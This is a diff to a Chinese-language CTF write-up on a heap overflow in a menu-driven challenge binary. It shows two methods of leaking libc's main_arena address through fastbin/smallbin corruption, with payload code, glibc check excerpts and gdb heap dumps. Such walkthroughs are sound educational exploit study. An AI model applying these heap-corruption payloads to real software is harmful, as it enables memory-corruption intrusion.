@@ -11,7 +11,7 @@ main_arena是heap各种bin的结构体，他的偏移量可以在libc.so中mallo
 ![malloc_trim](img/malloc_trim.PNG)<br>
 
 # 题目分析：<br>
-![](img/menu.PNG)
+![](img/menu.PNG)<br>
 漏洞点在allocate的时候申请一个大小，但是在fill的时候可以无视这个大小去填充，所以这里存在堆溢出<br>
 ## 1.fastbin attak：<br>
 核心思想是通过smallbin的fd或bk泄露main_arena的地址<br>
@@ -19,7 +19,7 @@ main_arena是heap各种bin的结构体，他的偏移量可以在libc.so中mallo
 1> 通过修改smallbin的size,使得可以用其他bin如fastbin指向一个smallbin，之后再将smallbin的size修改回来，free掉smallbin,然后通过指向smallbin的fastbin将smallbin的fd和bk读出来<br>
 2> 由于fastbin和smallbin在申请的时候堆地址的位置相邻，所以可以通过修改fastbin的size。让临近smallbin的fastbin的size，设置成刚好能够读取到smallbin的fd和bk的大小，然后free smallbin，通过相邻的fastbin来读取smallbin的fd和bk。<br>
 
-##具体实现：<br>
+## 具体实现：<br>
 ### 1>fastbin指向smallbin泄露libc<br>
 #### 第一步
 先申请以下五个chunk,其中0-3是fastbin，4是smallbin
@@ -46,7 +46,7 @@ gdb-peda$ x /64wx 0x555555757060
 0x555555757120:	0x00000000	0x00000000	0x00000000	0x00000000
 ```
 
-### 第二步
+#### 第二步
 将chunk1和chunk2链在fastbin链表上，此时： fastbin->chunk2,chunk2->fd->chunk1
 ```
 #为了将 chunk4(smallbin) 放在fastbin的链表上 
@@ -76,7 +76,7 @@ Fastbin0 :
 
 ```
 
-### 第三步
+#### 第三步
 破坏fastbin的链表<br>
 原本:fastbin->chunk2, chunk2->fd->chunk1<br>
 破坏后:fastbin->chunk2, chunk2->fd->chunk4<br>
@@ -107,7 +107,7 @@ Fastbin0 :
 0x5555557570e0 SIZE=0x20 DATA[0x5555557570f0] |................................| PREV_INUSE INUSED
 ```
 
-### 第四步
+#### 第四步
 为了alloc得到chunk4,必须要经过malloc的检测
 ```
 if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))
@@ -157,7 +157,7 @@ Fastbin0 :
 0x5555557570e0 SIZE=0x20 DATA[0x5555557570f0] |................................| PREV_INUSE INUSED
 ```
 
-### 第五步
+#### 第五步
 将chunk2和chunk4从fastbin链上取出，fastbin是单向链表，FILO<br>
 chunk2重新alloc的时候index会变成1，chunk4重新alloc的时候index会变成2<br>
 ```
@@ -190,7 +190,7 @@ overlap at 0x555555757100 -- size=0x0
 Chunk None
 ```
 
-### 第六步
+#### 第六步
 此时chunk2和chunk4指向的都是smallbin<br>
 我们只需要将chunk4的size在修改成0x91，free(chunk4)的时候就会将chunk4链接在main_arena的smallbin结构上，smallbin是双向链表，所以chunk4的fd和bk都会指向main_arena的smallbin的位置<br>
 再使用指向已经free之后chunk4的chunk2，dump(chunk2),就能将chunk4的fd和bk读出来了
@@ -231,19 +231,82 @@ gdb-peda$ heap all
 0x5555557622b0 SIZE=0x90 DATA[0x5555557622c0] |console-kit-daemon;cc1plus;make;| INUSED
 0x555555762340 SIZE=0x15cc0 TOP_CHUNK
 Last Remainder:  0x555555757170
+```
+泄露libc完成~
 
+### 2>fastbin包含smallbin泄露libc<br>
+#### 第一步
+首先申请三个堆块，chunk0,1,2。用chunk0来overwrite,伪造一个大的chunk1，去读chunk2(smallbin)的fd
+```
+alloc(0x30)
+alloc(0x10)
+alloc(0x100)
+
+gdb-peda$ x /64wx 0x555555757060
+0x555555757060:	0xf7ffd9d8	0x00007fff	0x00000041	0x00000000      -->chunk0(fastbin, in use)
+0x555555757070:	0x00000000	0x00000000	0x00000000	0x00000000
+0x555555757080:	0x00000000	0x00000000	0x00000000	0x00000000
+0x555555757090:	0x00000000	0x00000000	0x00000000	0x00000000
+0x5555557570a0:	0x00000000	0x00000000	0x00000021	0x00000000      -->chunk1(fastbin, in use)
+0x5555557570b0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x5555557570c0:	0x00000000	0x00000000	0x00000111	0x00000000      -->chunk2(smallbin, in use)
+0x5555557570d0:	0x00000000	0x00000000	0x00000000	0x00000000
+0x5555557570e0:	0x00000000	0x00000000	0x00000000	0x00000000
 ```
 
+#### 第二步
+Using chunk0 to overwrite the size of chunk1.<br>
+但是在free的时候，要经过free的一个检查机制
+```
+#ifndef INTERNAL_SIZE_T
+# define INTERNAL_SIZE_T size_t
+#endif
+/* The corresponding word size.  */
+#define SIZE_SZ (sizeof (INTERNAL_SIZE_T))
 
-
-
-
-
-
-
-
-
-
+if (__builtin_expect (nextchunk->size <= 2 * SIZE_SZ, 0)
+     || __builtin_expect (nextsize >= av->system_mem, 0))
+{
+     errstr = "free(): invalid next size (normal)";
+     goto errout;
+}
+```
+所以free的时候要满足伪造的chunk的`nextchunk->sixe > 2 * SIZE_SZ`，等价于`nextchunk->size > 16` 
+```
+payload='A'*0x30 + p64(0) + p64(0x41) + 'B'*0x30 + p64(0) + p64(0x41) 
+fill(0,payload)
+free(1)
+gdb-peda$ x /64wx 0x555555757060
+0x555555757060:	0xf7ffd9d8	0x00007fff	0x00000041	0x00000000      -->chunk0(fastbin, in use)
+0x555555757070:	0x41414141	0x41414141	0x41414141	0x41414141
+0x555555757080:	0x41414141	0x41414141	0x41414141	0x41414141
+0x555555757090:	0x41414141	0x41414141	0x41414141	0x41414141
+0x5555557570a0:	0x00000000	0x00000000	0x00000041	0x00000000      --------------------------------|
+0x5555557570b0:	0x42424242	0x42424242	0x42424242	0x42424242                                      |--->fake chunk1(fastbin, free)
+0x5555557570c0:	0x42424242	0x42424242	0x42424242	0x42424242      -->chunk2(smallbin, in use)     |
+0x5555557570d0:	0x42424242	0x42424242	0x42424242	0x42424242      ------------------------------- |
+0x5555557570e0:	0x00000000	0x00000000	0x00000041	0x00000000      -->fake chunk3(fastbin, fake in use)
+0x5555557570f0:	0x00000000	0x00000000	0x00000000	0x00000000      
+0x555555757100:	0x00000000	0x00000000	0x00000000	0x00000000
+0x555555757110:	0x00000000	0x00000000	0x00000000	0x00000000
+0x555555757120:	0x00000000	0x00000000	0x00000000	0x00000000
+0x555555757130:	0x00000000	0x00000000	0x00000000	0x00000000
+```
+可以看出修改之后的chunk1包含了chunk2的前0x20个字节，包含了chunk2的fd和bk区域,此时的堆栈情况如下,由于需要过free的检查机制，伪造了另一个chunk,
+```
+gdb-peda$ heap all
+0x555555757000 SIZE=0x30 DATA[0x555555757010] |................................| INUSED PREV_INUSE
+0x555555757030 SIZE=0x30 DATA[0x555555757040] |................................| INUSED PREV_INUSE
+0x555555757060 SIZE=0x40 DATA[0x555555757070] |AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA| INUSED PREV_INUSE      -->chunk0(fastbin, in use)
+0x5555557570a0 SIZE=0x40 DATA[0x5555557570b0] |........BBBBBBBBBBBBBBBBBBBBBBBB| INUSED PREV_INUSE
+0x5555557570e0 SIZE=0x40 DATA[0x5555557570f0] |................................| PREV_INUSE INUSED      -->fake chunk3(fastbin, fake in use)
+overlap at 0x555555757120 -- size=0x0
+Chunk None
+gdb-peda$ heap fastbin
+FASTBINS:
+Fastbin2 : 
+0x5555557570a0 SIZE=0x40 DATA[0x5555557570b0] |........BBBBBBBBBBBBBBBBBBBBBBBB| INUSED PREV_INUSE      -->fake chunk1(fastbin, free)
+```
 
 
 
